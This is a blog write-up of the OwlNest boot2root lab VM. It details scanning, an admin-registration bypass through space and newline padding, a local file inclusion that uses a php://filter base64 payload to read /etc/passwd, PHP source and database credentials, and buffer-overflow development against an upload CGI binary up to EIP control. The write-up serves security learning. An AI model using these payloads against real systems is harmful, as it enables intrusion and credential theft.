---
layout: post
title: "OwlNest Hacking Challenge"
date: 2014-09-10 16:06:59 -0400
comments: true
categories: boot2root
---

It seems like more and more boot2roots are being submitted to VulnHub as of late. OwlNest by [Swappage](http://www.twitter.com/swappage) is one of the more recent ones that packs a good challenge. Grab it over at [VulnHub](http://vulnhub.com/entry/owlnest-102,102/) if you're interested in giving it a go. This was debuted at ESC 2014 CTF where no one was able to solve it. It took me several days to finish off this beast after getting stuck in a tarpit, but this was a whole lot of fun. 

<!--more-->
After launching the OwlNest VM, I used netdiscover to identify its IP address. Enumeration is always the first step, so I fired up [onetwopunch.sh](https://github.com/superkojiman/onetwopunch) to see if anything interesting was running on the target. 

```
root@kali ~/owlnest
# onetwopunch.sh ip.txt all
[+] scanning 172.16.229.164 for all ports...
[+] obtaining all open TCP ports using unicornscan...
[+] unicornscan -msf 172.16.229.164:a -l udir/172.16.229.164-tcp.txt
[+] ports for nmap to scan: 22,80,111,31337,35599,
[+] nmap -sV -oX ndir/172.16.229.164-tcp.xml -oG ndir/172.16.229.164-tcp.grep -p 22,80,111,31337,35599, 172.16.229.164

Starting Nmap 6.47 ( http://nmap.org ) at 2014-09-10 17:57 EDT
Nmap scan report for 172.16.229.164
Host is up (0.00022s latency).
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
31337/tcp open  Elite?
35599/tcp open  status  1 (RPC #100024)

```

Port 80 and port 31337 looked interesting. I started off with 31337 since that seemed to be a custom service that was probably exploitable. Using netcat, I connected to the service and was greeted by a command interface, and some ASCII owls. 

```
root@kali ~/owlnest
# nc -v 172.16.229.164 31337
nc: 172.16.229.164 (172.16.229.164) 31337 [31337] open
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: 
```

Typing help returned a list of commands I could try. Basically username, password, privs, and login. I played around with this a bit, guessing some common usernames and passwords, injecting commands and the like, and of course none of them worked. I decided to move on to port 80 for now. 

First up, I tested the waters with nikto, looking for anything interesting. 

```
root@kali ~/owlnest
# nikto -h http://172.16.229.164
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          172.16.229.164
+ Target Hostname:    172.16.229.164
+ Target Port:        80
+ Start Time:         2014-09-10 20:47:08 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Debian)
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.4.4-14+deb7u12
+ The anti-clickjacking X-Frame-Options header is not present.
+ Root page / redirects to: /login_form.php
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.2.22 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.
+ OSVDB-630: IIS may reveal its internal or real IP in the Location header via a request to the /images directory. The value is "http://127.0.0.1/images/".
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3268: /graphics/: Directory indexing found.
+ OSVDB-3092: /graphics/: This might be interesting...
+ OSVDB-3268: /includes/: Directory indexing found.
+ OSVDB-3092: /includes/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, inode: 531023, size: 5108, mtime: Tue Aug 28 06:48:10 2007
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6604 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2014-09-10 20:48:11 (GMT-4) (63 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```


It identifed three directories; graphics, includes, images, and it noted that the root page redirected to login.php. Next, I used dirb to look for directories: 

```
root@kali ~/owlnest
# dirb http://172.16.229.164  /usr/share/dirb/wordlists/big.txt -o dirb.txt

-----------------
DIRB v2.21    
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.txt
START_TIME: Wed Sep 10 20:50:42 2014
URL_BASE: http://172.16.229.164/
WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt

-----------------

GENERATED WORDS: 20458                                                         

---- Scanning URL: http://172.16.229.164/ ----
==> DIRECTORY: http://172.16.229.164/application/                                         
==> DIRECTORY: http://172.16.229.164/css/                                                 
==> DIRECTORY: http://172.16.229.164/errors/                                              
==> DIRECTORY: http://172.16.229.164/fonts/                                               
==> DIRECTORY: http://172.16.229.164/forms/                                               
==> DIRECTORY: http://172.16.229.164/graphics/                                            
==> DIRECTORY: http://172.16.229.164/images/                                              
==> DIRECTORY: http://172.16.229.164/includes/                                            
==> DIRECTORY: http://172.16.229.164/js/                                                  
==> DIRECTORY: http://172.16.229.164/pictures/                                            
+ http://172.16.229.164/server-status (CODE:403|SIZE:295)                                 
                                                                                          
---- Entering directory: http://172.16.229.164/application/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://172.16.229.164/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://172.16.229.164/errors/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://172.16.229.164/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://172.16.229.164/forms/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://172.16.229.164/graphics/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://172.16.229.164/images/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://172.16.229.164/includes/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://172.16.229.164/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                                          
---- Entering directory: http://172.16.229.164/pictures/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)
                                                                               
-----------------
DOWNLOADED: 20458 - FOUND: 1
```

dirb found quite a few directories, all of which appeared to have directory indexing enabled. I would need to look into this further later on. For now, it was time to enumerate the webpage itself using a browser. 

I started up BurpSuite to capture requests/responses from the webserver and pointed my browser to http://172.16.229.164 I was greeted with a pretty login screen. 

->![](/images/2014-09-10/01.png)<-

I noticed it had an option at the bottom to register a new user. A quick look at BurpSuite showed that it had already identified some other PHP files including something called uploadform.php which looked like it loaded another PHP file, forms/form.php. This could be vulnerable to local file inclusion. 

->![](/images/2014-09-10/02.png)<-

Interestingly, when I looked at the rendered response from the root directory of the website, it displayed the content of a user who would be logged in. 


->![](/images/2014-09-10/03.png)<-

In fact, I was able to trigger this response by intercepting the response with BurSuite and changing the "302 Found" to "200 Found" and then forwarding the request. However it appeared that it simply logged me in as no user and I was unable to leverage this for anything. 

Back to the login page, I attempted once again some common user credentials and some basic SQL injection, but none of them worked. So I went ahead and clicked on the hyperlink to register a new account. 

->![](/images/2014-09-10/04.png)<-

I filled up the form, and set the username to "superkojiman" with the password "password". I clicked on register and was brought to a page confirming that my account had been created. 

->![](/images/2014-09-10/05.png)<-

I clicked on the login button and was brought back to the login screen. From here, I logged in with the user credentials I just created. 

->![](/images/2014-09-10/06.png)<-

I now had access to two more locations on the website; Gallery and Upload. Clicking on Gallery showed an album containing pictures of owls, but otherwise nothing of interest stood out. 

The Upload link was a different story. Clicking on it redirected me to the following error page which informed me that only the admin user could view this page. 

->![](/images/2014-09-10/07.png)<-

The request for this page, as captured by BurpSuite, was the following:

```
GET /uploadform.php?page=forms/form.php HTTP/1.1
Host: 172.16.229.164
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:24.0) Gecko/20140903 Firefox/24.0 Iceweasel/24.8.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://172.16.229.164/gallery.php
Cookie: PHPSESSID=3cea38kfmr6c3dafmql6bu2lb0
Connection: keep-alive
```

uploadform.php accepted a parameter page that could be set to load up a file called form/forms.php. I suspected I could specify other files on the server and it would display it, thereby making it vulnerable to local file inclusion. However it looked like the only way to do this was to get access to the admin user. 

One thing that worked was to simply access form.php directly through http://172.16.229.164/forms/form.php. 

->![](/images/2014-09-10/08.png)<-

Although it reported an undefined variable error at the top, it still allowed me to upload any kind of file, provided I filled in all the values. The error message also leaked the location of the website's document root as /var/www. To start off, I created a dummy text file with some content and successfully uploaded it, despite not being logged in as admin. 

->![](/images/2014-09-10/09.png)<-

One thing to note here is that the URL had changed to /application/upload. When I refreshed the page, it gave me an error message saying that the file I was trying to upload already existed. 

->![](/images/2014-09-10/10.png)<-

When I tried to download /application/upload using curl, I got the following response:

```
root@kali ~/owlnest
# curl -b "PHPSESSID=3cea38kfmr6c3dafmql6bu2lb0" http://172.16.229.164/application/upload
 / ___  ___ \
/ / @ \/ @ \ \
\ \___/\___/ /\
 \____\/____/||
 /     /\\\\\//
 |     |\\\\\\
  \      \\\\\\
   \______/\\\\
    _||_||_
     -- --
you gotta be kidding me, right?
```

It appeared that upload was some kind of CGI script, and it returned the ASCII owl error whenever the fields in the upload form weren't completed. 
 
Ok, getting back to having just uploaded a file. Although it was successful, it didn't tell me where the file had been saved to. After going through the list of directories dirb had discovered, I found it in the images directory, along with another file. 

->![](/images/2014-09-10/11.png)<-

Unfortunately these files weren't readable! I found that I could actually upload into the following directories: /var/www/images, /var/www/application, /tmp, /var/tmp, /var/lib/php5. In all cases, none of the files uploaded were readable and therefore unusable. It looked like the only way to get any further was to get admin access. 

I spent a good amount of time trying to bypass authentication on the login screen but was getting nowhere, so I turned my attention to the registration form once again. I used BurpSuite's Repeater feature to replay the initial registration I made while changing some of the values to see how the web application would behave. 

First, I couldn't create a user that already existed.

->![](/images/2014-09-10/12.png)<-

Or so it seemed. Upon closer inspection of the login name text field, I noticed that it restricted usernames to a maximum of 16 characters. So I tried a 17 character name to see what would happen. 

I changed the username to superkojiman12345 which was 17 characters and replayed the request. As expected, the account was successfully created.  

->![](/images/2014-09-10/13.png)<-

I then replayed the request again, only this time I changed the password to something different, and surprisingly, the account was successfully created! There were now two users that had the same username superkojiman12345.

->![](/images/2014-09-10/14.png)<-

From here, I knew I had to find a way to trick the server into creating another admin user. At this point my brain must have spazzed out because I spent a good number of hours hammering away at this. What finally worked was to pad the admin username with 11 spaces followed by a newline such that the entire username was 17 characters. 

```
username=admin%20%20%20%20%20%20%20%20%20%20%20%0a
``` 

->![](/images/2014-09-10/15.png)<-

The account was once again successfully created. I returned to the login screen,logged in with my new admin credentials, and sure enough, the web application used the new admin user I created instead of the original one and I finally had admin access. 

->![](/images/2014-09-10/16.png)<-

At this point I wanted to see if my hunch about the local file inclusion vulnerability was true, so I sent the captured request on BurSuite into Repeater, changed forms/form.php into /etc/passwd, and replayed the request. 

->![](/images/2014-09-10/17.png)<-

Brilliant! It worked, and I was able to read /etc/passwd. From that file I identified a user named rmp. Although I could read text files, I was unable to read the actual PHP files. Moreover, I wanted to have a look at the /application/upload CGI script and was unable to read it through this method as well. 

After a bit of researching, I found this nifty post by [DiabloHorn](http://diablohorn.wordpress.com/2010/01/16/interesting-local-file-inclusion-method/) that allowed me to leverage the local file inclusion vulnerability such that I could read the contents of PHP files and the CGI script. Instead of just specifying the file I wanted to read, I had to use a PHP filter which would base64 encode the file thereby allowing me to download it. Essentially:  

```
uploadform.php?page=php://filter/convert.base64-encode/resource=/var/www/login.php
```

Sure enough, this returned a base64 encoded login.php

->![](/images/2014-09-10/18.png)<-

Using this method, I was able to download the upload CGI script with curl. 

```
root@kali ~/owlnest
# curl -b "PHPSESSID=3cea38kfmr6c3dafmql6bu2lb0" http://172.16.229.164/uploadform.php?page=php://filter/convert.base64-encode/resource=application/upload | base64 -d > upload
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  800k    0  800k    0     0  28.2M      0 --:--:-- --:--:-- --:--:-- 28.9M

root@kali ~/owlnest
# file upload 
upload: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, for GNU/Linux 2.6.26, BuildID[sha1]=0x81afd8c77d846372b791ff4646807e51b270a974, not stripped

root@kali ~/owlnest
# chmod 755 upload && ./upload
Content-type: text/plain

 / ___  ___ \
/ / @ \/ @ \ \
\ \___/\___/ /\
 \____\/____/||
 /     /\\\\\//
 |     |\\\\\\
  \      \\\\\\
   \______/\\\\
    _||_||_
     -- --
you gotta be kidding me, right?
```

Great, it worked! Before examining the upload binary closer, I wanted to continue enumerating the server for more clues now that I had the ability to read PHP files. Receiving a base64 encoded response and decoding it through BurpSuite was tedious, so I used a tool I wrote a while back called [dirtshell](https://github.com/superkojiman/dirtshell). 

I modified it slightly such that it would pipe the output of curl to base64 for decoding:

```bash
curl -s ${cookie} ${url}${prefix}${cmd}${suffix} | base64 -d
```

I could now easily read files on the server through a "shell". For example, the includes directory dirb found contained a file called config_inc.php. I knew the website's document root was in /var/www, so I simply entered the full path to config_inc.php and was able to read its contents: 

```text
root@kali ~/owlnest
# dirtshell -c "PHPSESSID=3cea38kfmr6c3dafmql6bu2lb0" -u "http://172.16.229.164/uploadform.php?page=php://filter/convert.base64-encode/resource="
[>] /var/www/includes/config_inc.php
[+] requesting http://172.16.229.164/uploadform.php?page=php://filter/convert.base64-encode/resource=/var/www/includes/config_inc.php
<?

$dbhost = "localhost";
$dbuser = "owlnest";
$dbpassword = "pwningthedatabasewontgetyouanywhere";
$dbname = "owlnest";

?>

[>] 
```
After spending some time enumerating the server and getting nowhere that would land me a shell, I decided to focus my attention onto the upload binary. This binary was launched whenever a file was uploaded, so if a vulnerability was present, I might be able to use it to get a reverse shell into the target. 

I loaded it up into gdb and checked to see if it had any security features built into it:

```
root@kali ~/owlnest
# gdb -q upload 
Reading symbols from /root/owlnest/upload...(no debugging symbols found)...done.
gdb-peda$ checksec 
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
gdb-peda$ 
```

Nothing! I wasn't sure if the server had ASLR on, but to be on the safe side, I kept it turned on on my machine. I disassembled the main() function and found calls to CGI functions:

```
   0x08048340 <+105>:   call   0x8049c56 <CGI_get_all>
   0x08048345 <+110>:   mov    DWORD PTR [ebp-0x20],eax
   0x08048348 <+113>:   mov    DWORD PTR [esp+0x4],0x80ae93c
   0x08048350 <+121>:   mov    eax,DWORD PTR [ebp-0x20]
   0x08048353 <+124>:   mov    DWORD PTR [esp],eax
   0x08048356 <+127>:   call   0x8049d34 <CGI_lookup_all>
   0x0804835b <+132>:   mov    DWORD PTR [ebp-0x24],eax
   0x0804835e <+135>:   mov    DWORD PTR [esp+0x4],0x80ae948
   0x08048366 <+143>:   mov    eax,DWORD PTR [ebp-0x20]
   0x08048369 <+146>:   mov    DWORD PTR [esp],eax
   0x0804836c <+149>:   call   0x8049d34 <CGI_lookup_all>
   0x08048371 <+154>:   mov    DWORD PTR [ebp-0x28],eax
   0x08048374 <+157>:   mov    DWORD PTR [esp+0x4],0x80ae94d
   0x0804837c <+165>:   mov    eax,DWORD PTR [ebp-0x20]
   0x0804837f <+168>:   mov    DWORD PTR [esp],eax
   0x08048382 <+171>:   call   0x8049d34 <CGI_lookup_all>
   0x08048387 <+176>:   mov    DWORD PTR [ebp-0x2c],eax
   0x0804838a <+179>:   mov    DWORD PTR [esp+0x4],0x80ae953
   0x08048392 <+187>:   mov    eax,DWORD PTR [ebp-0x20]
   0x08048395 <+190>:   mov    DWORD PTR [esp],eax
   0x08048398 <+193>:   call   0x8049d34 <CGI_lookup_all>
```

A quick Google search revealed that these belonged to the [C CGI Library](http://libccgi.sourceforge.net/doc.html). The documentation was relatively clear and I started off by stepping through the program and trying to understand how each function worked and what arguments the binary needed to get to the stage where it would start uploading a file. 

It then occured to me that I was wasting my time reverse engineering the CGI functions as the C CGI library was open source! After I downloaded the source code, I found that it came with a convenient test script that allowed me to see exactly what I needed to pass into the binary to get it to work for file uploads: 

```bash
TEST=5  ########################################

# Testing upload

/bin/rm -f cgi-upload-??????
CONTENT_TYPE='multipart/form-data; boundary=----12345' \
./test upload > result 2> result <<'E-O-F'
------12345
Content-Disposition: form-data; name="var1"

Value # 1
------12345
Content-Disposition: form-data; name="upload"; filename="input"

This is a test uploaded file
Here is the second line.
The quick brown fox jumped over the lazy dog
(or was that a hog?)
Now is the time for
all good men
to come to the aid of
their party!

------12345--
E-O-F
```

So I needed to set the environment variable CONTENT_TYPE first, and then redirect the contents of the multipart/form-data into the binary. I knew this binary would upload a file into /var/www/images, so I created that directory first. Next I created the multipart/form-data itself, from the request I initially sent to the target to upload the dummy file:

```text
-----------------------------200953101619859560161384131169
Content-Disposition: form-data; name="name"

superkojiman
-----------------------------200953101619859560161384131169
Content-Disposition: form-data; name="email"

foo@bar.com
-----------------------------200953101619859560161384131169
Content-Disposition: form-data; name="description"

dummy text file
-----------------------------200953101619859560161384131169
Content-Disposition: form-data; name="uploadfield"; filename="dummy.txt"
Content-Type: text/plain

This is a dummy text file.
Nothing to see here. 

-----------------------------200953101619859560161384131169--
```

Note that the newlines in the request.txt file must be CR/LF for this to work. Once the request.txt file was set, I redirected it into the upload binary to see if it would work:

```
root@kali ~/owlnest
# mkdir /var/www/images

root@kali ~/owlnest
# CONTENT_TYPE="multipart/form-data; boundary=---------------------------200953101619859560161384131169" ./upload < request.txt 
Content-type: text/plain

File uploaded successfully

Summary Informations:
Your Name: superkojiman
Your email: foo@bar.com
Image Description: dummy text file
Uploaded Filename: dummy.txt

root@kali ~/owlnest
# ls -l /var/www/images
total 4
-rw------- 1 root root 49 Sep 11 01:02 dummy.txt
```

Excellent! The file was transferred over into /var/www/images. Now that I had a way to get the upload binary working, it was time to see if I could find a vulnerability. 

Back into gdb, I disassembled the main() function again and found a call to a function called validateEmail(). 

```
   0x080486b6 <+991>:    call   0x804c230 <fwrite>
   0x080486bb <+996>:   mov    eax,DWORD PTR [ebp-0x2c]
   0x080486be <+999>:   mov    eax,DWORD PTR [eax]
   0x080486c0 <+1001>:  mov    DWORD PTR [esp],eax
   0x080486c3 <+1004>:  call   0x8048254 <validateEmail>
   0x080486c8 <+1009>:  mov    eax,ds:0x80cece0
   0x080486cd <+1014>:  mov    DWORD PTR [esp+0xc],eax
   0x080486d1 <+1018>:  mov    DWORD PTR [esp+0x8],0x1e
   0x080486d9 <+1026>:  mov    DWORD PTR [esp+0x4],0x1
```

I used [Hopper's](http://www.hopperapp.com) pseudocode feature to turn the assembly into more readable C code: 

```c
int validateEmail(int arg0, int arg1) {
    var_C = __libc_malloc(strlen(arg_0) + 0x1);
    strcpy(var_C, arg_0);
    var_10 = strtok(var_C, 0x80ae908);
    var_10 = strtok(0x0, 0x80ae908);
    if (var_10 != 0x0) {
            strcpy(var_110, var_10);
    }
    return 0x0;
}
```

This function was basically using strtok to split the email address using the "@" symbol as the delimiter, and then copying the domain into a buffer. By providing a very long domain, it was possible to overwrite the saved return address on the stack. 

To test this out, I modified request.txt to include 800 "A"s as the domain. 

```text
Content-Disposition: form-data; name="email"

foo@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.com
```

Next, I passed it into the upload binary to see if it would indeed crash as I suspected:

```
root@kali ~/owlnest
# rm /var/www/images/dummy.txt 

root@kali ~/owlnest
# ulimit -c unlimited

root@kali ~/owlnest
# CONTENT_TYPE="multipart/form-data; boundary=---------------------------200953101619859560161384131169" ./upload < request.txt 
Content-type: text/plain

Segmentation fault (core dumped)
```

The binary crashed! A quick check with gdb showed that EIP had been overwritten with 0x41414141:

```
root@kali ~/owlnest
# gdb -c core  -q -batch -n -ex 'p $eip'
[New LWP 6758]
Core was generated by `./upload'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
$1 = (void (*)()) 0x41414141
```

Now all I had to do was figure out what the offset to EIP was. I generated a 800 byte cyclic pattern with pattern_create.rb that I could use to find the offset. This is what the updated email address looked like using the cyclic pattern: 

```
-----------------------------200953101619859560161384131169
Content-Disposition: form-data; name="email"

foo@Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba.com
```

I triggered the crash again to generate the core dump: 

```
root@kali ~/owlnest
# rm -f /var/www/images/dummy.txt 

root@kali ~/owlnest
# CONTENT_TYPE="multipart/form-data; boundary=---------------------------200953101619859560161384131169" ./upload < request.txt 
Content-type: text/plain

Segmentation fault (core dumped)

root@kali ~/owlnest
# gdb -c core  -q -batch -n -ex 'p $eip'
[New LWP 8903]
Core was generated by `./upload'.
Program terminated with signal 11, Segmentation fault.
#0  0x41326a41 in ?? ()
$1 = (void (*)()) 0x41326a41
```

EIP had been set to 0x41326a41. Passing this value into pattern_offset.rb revealed that EIP was being overwritten 276 bytes right after the "@" symbol:

```
root@kali ~/owlnest
# pattern_offset.rb 0x41326a41
[*] Exact match at offset 276
```

To verify this, I updated the domain entry in request.txt once again such that EIP would be overwritten by four "B"s instead. 

```
-----------------------------200953101619859560161384131169
Content-Disposition: form-data; name="email"

foo@-----------------------------200953101619859560161384131169
Content-Disposition: form-data; name="email"

foo@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC.com
```

I was still passing 800 bytes in order to keep things consistent. Triggering the crash and checking the value of EIP showed that I was overwriting it with the correct value:

```
root@kali ~/owlnest
# CONTENT_TYPE="multipart/form-data; boundary=---------------------------200953101619859560161384131169" ./upload < request.txt 
Content-type: text/plain

Segmentation fault (core dumped)

root@kali ~/owlnest
# gdb -c core  -q -batch -n -ex 'p $eip'
[New LWP 8959]
Core was generated by `./upload'.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
$1 = (void (*)()) 0x42424242

```

Now that I had control of EIP, I had to figure out where I could redirect that control to. A quick peek at the stack showed that the payload after EIP was in there: 

```
root@kali ~/owlnest
# gdb -c core  -q -batch -n -ex 'x/100wx $esp'
[New LWP 8959]
Core was generated by `./upload'.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
0xbfa0d7c0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d7d0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d7e0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d7f0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d800: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d810: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d820: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d830: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d840: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d850: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d860: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d870: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d880: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d890: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d8a0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d8b0: 0x43434343  0x43434343  0x43434343  0x43434343
0xbfa0d8c0: 0x43434343  0x43434343  0x43434343  0x43434343
